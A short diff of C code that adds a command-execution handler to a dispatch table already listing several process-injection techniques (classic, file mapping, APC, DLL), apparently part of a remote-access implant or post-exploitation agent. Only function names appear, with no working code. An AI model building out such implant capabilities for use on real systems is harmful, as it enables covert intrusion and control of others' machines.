@@ -12,7 +12,8 @@ TaskHandler handles[] =
     injectViaClassicProcessTask,
     injectViaFileMappingTask,
     injectViaApcTask,
-    injectViaDllTask
+    injectViaDllTask,
+    executeCommandTask
 };
 
 void _processMessage(PTASK_MANAGER pTaskManager);
